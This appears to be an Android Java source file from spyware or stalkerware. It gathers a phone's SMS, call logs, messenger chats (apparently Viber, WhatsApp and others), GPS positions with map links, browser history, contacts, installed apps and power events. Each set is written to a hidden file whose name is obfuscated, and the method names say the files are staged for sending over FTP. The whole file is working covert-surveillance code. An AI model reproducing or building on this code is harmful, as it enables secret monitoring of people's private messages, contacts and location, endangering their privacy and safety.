package com.dwreload;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.nio.charset.Charset;
import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Locale;

import org.json.JSONArray;
import org.json.JSONException;

import com.dwreload.lib.BrowserHistory;
import com.dwreload.lib.Call;
import com.dwreload.lib.Contact;
import com.dwreload.lib.GPS;
import com.dwreload.lib.IMMessage;
import com.dwreload.lib.IMessageBody;
import com.dwreload.lib.SMS;

import android.content.Context;
//import android.util.Log;


public class FTPNotification {
	private Context mContext;
	
	public FTPNotification(Context context)
		{
		this.mContext = context;
		}
	
		

	
	//---------------------------------------------------------------------------------------------------------------------------------------------------------
	public Boolean sendSmsToFTP(ArrayList<IMessageBody> list)
		{
		if (list.size() == 0)
			{
			return true;
			}
		final String[] SMSDIR = new String[]  { "", mContext.getString(R.string.insms),  mContext.getString(R.string.outsms),  mContext.getString(R.string.missedsms)};
		SMS obj = null;
		String filename = "";
		String text = "";
		String datetime = "";
		for (IMessageBody el : list)
			{
			obj = (SMS) el;
			if (obj.type > 3)
				{
				obj.type = 0;
				}
			datetime = obj.getStringDate();
			text =	text.concat(SMSDIR[obj.type]).concat(": ").concat(obj.number).concat(" (").concat(obj.name).concat(")").concat( "\r\n")
						.concat(mContext.getString(R.string.timeanddate)).concat(": ").concat(obj.getStringDate()).concat("\r\n")
						.concat(mContext.getString(R.string.smsbody)).concat(": ").concat(obj.text).concat("\r\n")
						.concat("-------------------------------").concat("\r\n");
			}
		datetime = datetime.replace(':', '$').replace('.', '%').replace('0', 'A').replace('1', 'B').replace('2', 'C').replace('3', 'D').replace('4', 'E').replace('5', 'F')
				.replace('6', 'G').replace('7', 'H').replace('8', 'I').replace('9', 'J');
		filename = ".&" + datetime + "@#" + "SKTXWXUQXXW";//SMS History.txt
		try
			{
			File file = new File(mContext.getExternalFilesDir(null), filename);
			OutputStream os = new FileOutputStream(file);
			os.write(text.getBytes(Charset.forName("UTF-8")));
			/* проверяем, что все действительно записалось и закрываем файл */
			os.flush();
			os.close();
			} 
		catch (FileNotFoundException e)
			{
			return false;
	        }
		catch (Exception e)
			{
			return false;
			}
		return true;
		}
	//---------------------------------------------------------------------------------------------------------------------------------------------------------
	public Boolean sendCallToFTP(ArrayList<IMessageBody> list)
		{
		if (list.size() == 0)
			{
			return true;
			}
		final String[] CALLDIR = new String[]  { "", mContext.getString(R.string.incall),  mContext.getString(R.string.outcall),  mContext.getString(R.string.misscall)};
		Call obj = null;
		String filename = "";
		String text = "";
		String datetime = "";
		Long min = (long) 0;
		Long sec = (long) 0;
		String length;
		for (IMessageBody el : list)
			{
			obj = (Call) el;
			if (obj.type > 3)
				{
				obj.type = 0;
				}
			datetime = obj.getStringDate();
			min = obj.duration/60;
			sec = obj.duration - (min*60);
			if (min > 0) length = (Long.toString(min)).concat(mContext.getString(R.string.minutes)).concat(" ").concat(Long.toString(sec)).concat(mContext.getString(R.string.seconds));
			else if (min == 0) length = (Long.toString(sec)).concat(mContext.getString(R.string.seconds));
			else length = "--:--";
			text =	text.concat(CALLDIR[obj.type]).concat(": ").concat(obj.number).concat(" (").concat(obj.name).concat(")").concat("\r\n")
					.concat(mContext.getString(R.string.timeanddate)).concat(": ").concat(obj.getStringDate()).concat("\r\n")
					.concat(mContext.getString(R.string.calllength)).concat(": ").concat(length).concat("\r\n")
					.concat("-------------------------------").concat("\r\n");
			}
		datetime = datetime.replace(':', '$').replace('.', '%').replace('0', 'A').replace('1', 'B').replace('2', 'C').replace('3', 'D').replace('4', 'E').replace('5', 'F')
				.replace('6', 'G').replace('7', 'H').replace('8', 'I').replace('9', 'J');
		
		filename = ".&" + datetime + "@#" + "R2T9TSLSXXW";//Calls History.txt
		try
			{
			File file = new File(mContext.getExternalFilesDir(null), filename);
			OutputStream os = new FileOutputStream(file);
			os.write(text.getBytes(Charset.forName("UTF-8")));
			/* проверяем, что все действительно записалось и закрываем файл */
			os.flush();
			os.close();
			} 
		catch (FileNotFoundException e)
			{
			return false;
			}
		catch (Exception e)
			{
			return false;
			}
		return true;
		}
	//---------------------------------------------------------------------------------------------------------------------------------------------------------
		public Boolean sendSocialToFTP(ArrayList<IMessageBody> list, Integer type)
			{
			if (list.size() == 0)
				{
				return true;
				}
			final String[] DIR = new String[]  { "", mContext.getString(R.string.insms),  mContext.getString(R.string.outsms)};
			final String[] SocialType = new String[]  { "", "VBR",  "WTP", "KNT", "OKR"};
			IMMessage obj = null;
			String filename = "";
			String text = "";
			String datetime = "";
			for (IMessageBody el : list)
				{
				obj = (IMMessage) el;
				text =	text.concat(DIR[obj.type]).concat(": ").concat(obj.name).concat("\r\n")
						.concat(mContext.getString(R.string.timeanddate)).concat(": ").concat(obj.getStringDate()).concat("\r\n")
						.concat(mContext.getString(R.string.smsbody)).concat(": ").concat(obj.text)
						.concat("\r\n-------------------------------\r\n");
				}
			datetime = obj.getStringDate();
			datetime = datetime.replace(':', '$').replace('.', '%').replace('0', 'A').replace('1', 'B').replace('2', 'C').replace('3', 'D').replace('4', 'E').replace('5', 'F')
					.replace('6', 'G').replace('7', 'H').replace('8', 'I').replace('9', 'J');
			filename = ".&" + datetime + "@#" + SocialType[type] + "XRXYQXXW";//History.txt
			try
				{
				File file = new File(mContext.getExternalFilesDir(null), filename);
				OutputStream os = new FileOutputStream(file);
				os.write(text.getBytes(Charset.forName("UTF-8")));
				/* проверяем, что все действительно записалось и закрываем файл */
				os.flush();
				os.close();
				} 
			catch (FileNotFoundException e)
				{
				return false;
		        }
			catch (Exception e)
				{
				return false;
				}
			return true;
			}
	//---------------------------------------------------------------------------------------------------------------------------------------------------------
	public Boolean sendGPSToFTP(ArrayList<IMessageBody> list)
		{
		if (list.size() == 0)
			{
			return true;
			}
		GPS obj = null;
		SimpleDateFormat sdf = new SimpleDateFormat("dd.MM.yyyy hh:mm",new Locale("ru","RU"));
		String filename = "";
		String text = "";
		String sDate = "";
		double lat = 0;
		double lon = 0;
		for (IMessageBody el : list)
			{
			obj = (GPS) el;
			lat = obj.lat;
			lon = obj.lon;
			sDate = sdf.format(new Date(obj.date));
			
			text =  text.concat(mContext.getString(R.string.timeanddate)).concat(": ").concat(sDate).concat("\r\n")
					.concat(mContext.getString(R.string.accuracy)).concat(": ").concat(String.valueOf(obj.acc)).concat(" m.\r\n")
					.concat("https://maps.google.com/maps?q=").concat(String.valueOf(lat)).concat(",").concat(String.valueOf(lon)).concat("&z=14&ll=").concat(String.valueOf(lat)).concat(",").concat(String.valueOf(lon)).concat("&t=k \r\n")
					.concat(mContext.getString(R.string.battery)).concat(": ").concat(String.valueOf(obj.battery)).concat("%\r\n")
					.concat("-------------------------------\r\n");
			}
		sDate = sDate.replace(':', '$').replace('.', '%').replace('0', 'A').replace('1', 'B').replace('2', 'C').replace('3', 'D').replace('4', 'E').replace('5', 'F')
				.replace('6', 'G').replace('7', 'H').replace('8', 'I').replace('9', 'J');
		filename = ".&" + sDate + "@#" + "PVT1XULKXXW";//GPS History.txt
		try
			{
			File file = new File(mContext.getExternalFilesDir(null), filename);
			OutputStream os = new FileOutputStream(file);
			os.write(text.getBytes(Charset.forName("UTF-8")));
			/* проверяем, что все действительно записалось и закрываем файл */
			os.flush();
			os.close();
			} 
		catch (FileNotFoundException e)
			{
			return false;
	        }
		catch (Exception e)
			{
			return false;
			}
		return true;
		}
	//---------------------------------------------------------------------------------------------------------------------------------------------------------
	public Boolean sendHistoryToFTP(ArrayList<IMessageBody> list)
		{
		if (list.size() == 0)
			{
			return true;
			}
		BrowserHistory obj = null;
		String text = "";
		String filename = "";
	    String sDate = "";

		for (IMessageBody el : list)
			{
			obj = (BrowserHistory) el;
			sDate = obj.getStringDate();
			
			text =  text.concat(mContext.getString(R.string.timeanddate)).concat(": ").concat(sDate).concat("\r\n")
					.concat(obj.url)
					.concat("\r\n-------------------------------\r\n");
			}
		sDate = sDate.replace(':', '$').replace('.', '%').replace('0', 'A').replace('1', 'B').replace('2', 'C').replace('3', 'D').replace('4', 'E').replace('5', 'F')
				.replace('6', 'G').replace('7', 'H').replace('8', 'I').replace('9', 'J');
		filename = ".&" + sDate + "@#" + "RZTYL7UMXXW";//Browser History.txt

		try
			{
			File file = new File(mContext.getExternalFilesDir(null), filename);
			OutputStream os = new FileOutputStream(file);
			os.write(text.getBytes(Charset.forName("UTF-8")));
			/* проверяем, что все действительно записалось и закрываем файл */
			os.flush();
			os.close();
			} 
		catch (FileNotFoundException e)
			{
			return false;
	        }
		catch (Exception e)
			{
			return false;
			}
		return true;
		}
	//---------------------------------------------------------------------------------------------------------------------------------------------------------
	public Boolean sendContactsToFTP(ArrayList<IMessageBody> list){
		if (list.size() == 0)
			{
			return true;
			}		
		Contact obj = null;
		String text = "";
		String filename = ".T45QWTY9LTXXW";//Contact list.txt

		for (IMessageBody el : list)
			{
			obj = (Contact) el;
			text =  text.concat(obj.name).concat("\r\n")
						.concat(obj.number)
						.concat("\r\n-------------------------------\r\n");		
			}
		try
			{
			File file = new File(mContext.getExternalFilesDir(null), filename);
			OutputStream os = new FileOutputStream(file);
			os.write(text.getBytes(Charset.forName("UTF-8")));
			/* проверяем, что все действительно записалось и закрываем файл */
			os.flush();
			os.close();
			} 
		catch (FileNotFoundException e)
			{
			return false;
	        }
		catch (Exception e)
			{
			return false;
			}
		return true;
		}
	//---------------------------------------------------------------------------------------------------------------------------------------------------------
	public Boolean sendApplistToFTP(JSONArray list) throws JSONException{
		if (list.length() == 0)
			{
			return false;
			}		
		
		String text = "";
		String filename = ".LORUUSTRQ5XXW";//Applist.txt
		Integer i = list.length();
		for (int a = 0; a < i; a++ )
			{
			text =  text.concat(list.getString(a)).concat("\r\n");
			}
		try
			{
			File file = new File(mContext.getExternalFilesDir(null), filename);
			OutputStream os = new FileOutputStream(file);
			os.write(text.getBytes(Charset.forName("UTF-8")));
			/* проверяем, что все действительно записалось и закрываем файл */
			os.flush();
			os.close();
			} 
		catch (FileNotFoundException e)
			{
			return false;
	        }
		catch (Exception e)
			{
			return false;
			}
		return true;
		}
	//---------------------------------------------------------------------------------------------------------------------------------------------------------
	public Boolean sendOnOffToFTP(Boolean onoff, String dat)
		{
		String filename = ".XLLYR23RT" + (onoff?"VKL":"ZWO" +"XXW");
		String text = "Phone is switched " + " at " + dat;
		try
			{
			File file = new File(mContext.getExternalFilesDir(null), filename);
			OutputStream os = new FileOutputStream(file);
			os.write(text.getBytes(Charset.forName("UTF-8")));
			/* проверяем, что все действительно записалось и закрываем файл */
			os.flush();
			os.close();
			} 
		catch (FileNotFoundException e)
			{
			return false;
	        }
		catch (Exception e)
			{
			return false;
			}
		return true;
		}
	//---------------------------------------------------------------------------------------------------------------------------------------------------------
	public void sendSettingsToFTP(String settings)
		{
		try
			{
			File file = new File(mContext.getExternalFilesDir(null), ".VQTROW23S9XXW");//Settings.txt
			OutputStream os = new FileOutputStream(file);
			os.write(settings.getBytes(Charset.forName("UTF-8")));
			/* проверяем, что все действительно записалось и закрываем файл */
			os.flush();
			os.close();
			} 
		catch (FileNotFoundException e){}
		catch (Exception e){}
		}
}
